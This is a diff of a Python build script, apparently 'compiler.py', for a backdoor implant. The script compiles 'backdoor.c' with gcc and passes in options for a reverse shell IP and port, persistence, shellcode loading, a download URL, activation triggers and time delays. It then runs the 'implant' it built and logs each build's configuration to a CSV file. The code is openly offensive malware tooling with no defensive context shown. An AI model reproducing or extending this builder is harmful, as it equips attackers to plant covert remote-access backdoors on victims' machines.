@@ -2,8 +2,8 @@ import datetime
 import argparse
 import binascii
 import os
-#import backdoor.c
 import subprocess
+import csv
 
 parser = argparse.ArgumentParser("python compiler.py", usage='%(prog)s [-o fileName] [-p listener] [-intfc eth0] [-act SECRET_PORTS] [-key 200,300,400] [-atkSc] [-a x64] [-p linux] [-ip 192.160.1.100] [-revip 192.168.2.132] [-revport 1337] [-strip]')
 
@@ -25,7 +25,6 @@ parser.add_argument("-pay", "--payload",type=str, metavar='',
                     help="payload type", default="listener")
 parser.add_argument("-o", "--outputName",type=str, metavar='',
                     help="output filename", default="implant")
-'''
 parser.add_argument("-intfc", "--interface",type=str, metavar='',
                     help="listener interface")
 parser.add_argument("-act", "--activate", type=str, metavar='',
@@ -60,29 +59,107 @@ parser.add_argument("-strip", "--strip", action="store_true",
                     help="strip the binary")
 parser.add_argument("-static", "--static", action="store_true",
                     help="statically link the binary")
-'''
+
 args = parser.parse_args()
+print(args)
 
 cmd = ["gcc", "backdoor.c", "-o", args.outputName]
 
 arg = str(args.ipAddress)
+#DEBUG
 if args.debug:
-    cmd.insert(1, "-D DEBUG 1")
+    cmd.insert(1, "-D DEBUG=1")
 else:
-    cmd.insert(1, "-D DEBUG 0")
+    cmd.insert(1, "-D DEBUG=0")
+#IPADDRESS
 if args.ipAddress != "unknown":
     cmd.insert(1, "-D IPADDR=\"" + args.ipAddress +"\"")
+#DOMAIN
+if args.domain != "unknown":
+    cmd.insert(1, "-D DOMAIN=\"" + args.domain +"\"")
+#PLATFORM
+if args.platform != "unknown":
+    cmd.insert(1, "-D PLATFORM=\"" + args.platform +"\"")
+#ARCHITECTURE
+if args.architecture != "unknown":
+    cmd.insert(1, "-D ARCH=\"" + args.architecture +"\"")
+#OS
+if args.os != "unknown":
+    cmd.insert(1, "-D OS=\"" + args.os +"\"")
+#VERSION_NUMBER
+if args.versionNumber != "unknown":
+    cmd.insert(1, "-D VERSION_NUM=\"" + args.versionNumber +"\"")
+#PAYLOAD
+if args.payload != "unknown":
+    cmd.insert(1, "-D PAYLOAD=\"" + args.payload +"\"")
+#INTERFACE
+if args.interface is not None:
+    cmd.insert(1, "-D INTERFACE=\"" + args.interface +"\"")
+#ACTIVATE
+if args.activate is not None:
+    cmd.insert(1, "-D ACTIVATE=\"" + args.activate +"\"")
+#SIZE
+if args.size is not None:
+    cmd.insert(1, "-D SIZE=\"" + args.size +"\"")
+#TRIGGER
+if args.trigger is not None:
+    cmd.insert(1, "-D TRIGGER=\"" + args.trigger +"\"")
+#DELAY
+if args.timeDelay is not None:
+    cmd.insert(1, "-D TIMEDELAY=\"" + args.timeDelay +"\"")
+#DATEDELAY
+if args.dateDelay is not None:
+    cmd.insert(1, "-D DATEDELAY=\"" + args.dateDelay +"\"")
+#DOWNLOADURL
+if args.downloadURL is not None:
+    cmd.insert(1, "-D DOWNLOADURL=\"" + args.downloadURL +"\"")
+#BANG
+if args.bang:
+    cmd.insert(1, "-D BANG=1")
+else:
+    cmd.insert(1, "-D BANG=0")
+#LOADSHELLCODE
+if args.loadShellcode:
+    cmd.insert(1, "-D LOADSHELLCODE=1")
+else:
+    cmd.insert(1, "-D LOADSHELLCODE=0")
+#REVERSESHELL
+if args.reverseShell:
+    cmd.insert(1, "-D REVERSESHELL=1")
+else:
+    cmd.insert(1, "-D REVERSESHELL=0")
+#REVERSEIP
+if args.reverseIP is not None:
+    cmd.insert(1, "-D REVERSEIP=\"" + args.reverseIP +"\"")
+#REVERSEPORT
+if args.reversePort is not None:
+    cmd.insert(1, "-D REVERSEPORT=\"" + args.reversePort +"\"")
+#PERSIST
+if args.persistence is not None:
+    cmd.insert(1, "-D PERSIST=\"" + args.persistence +"\"")
+#NOTES
+if args.notes != "No notes":
+    cmd.insert(1, "-D NOTES=\"" + args.notes +"\"")
+#STRIP
+if args.strip:
+    cmd.insert(1, "-D STRIP=1")
+else:
+    cmd.insert(1, "-D STRIP=0")
+#STATIC
+if args.static:
+    cmd.insert(1, "-D STATIC=1")
+else:
+    cmd.insert(1, "-D STATIC=0")
 
 subprocess.run(cmd)
 subprocess.run("./implant")
 
-'''
+
 with open('log.csv', mode='a+') as log_file:
 
     log_writer = csv.writer(log_file, delimiter='\t', quotechar='"', quoting=csv.QUOTE_MINIMAL)
-    if (file_exists != 1):
-        fieldnamesList = ["datetime", "ipAddress", "domain", "architecture", "platform", "os", "versionNumber", "payload", "activate", "interface", "key", "size", "dateDelay", "timeDelay", "trigger", "persistence", "bang", "downloadURL", "loadShellcode", "reverseShell", "reverseIP", "reversePort", "Notes", "debug", "outputName", "strip", "static"]
+    if (log_writer is not None):
+        fieldnamesList = ["datetime", "ipAddress", "domain", "architecture", "platform", "os", "key", "dateDelay", "timeDelay", "persistence", "loadShellcode", "reverseShell", "reverseIP", "reversePort"]
         log_writer.writerow(fieldnamesList)
 
-    log_writer.writerow([str(datetime.datetime.now()), str(args.ipAddress), str(args.domain), str(args.architecture), str(args.platform), str(args.os), str(args.versionNumber), str(args.payload), str(args.activate), str(args.interface), str(args.key), str(args.size), str(args.dateDelay), str(args.timeDelay), str(args.trigger), str(args.persistence), str(args.bang), str(args.downloadURL), str(args.loadShellcode), str(args.reverseShell), str(args.reverseIP), str(args.reversePort), str(args.notes), str(args.debug), str(args.outputName), str(args.strip), str(args.static)])
-'''
+    log_writer.writerow([str(datetime.datetime.now()), str(args.ipAddress), str(args.domain), str(args.architecture), str(args.platform), str(args.os), str(args.key), str(args.dateDelay), str(args.timeDelay), str(args.persistence), str(args.loadShellcode), str(args.reverseShell), str(args.reverseIP), str(args.reversePort)])
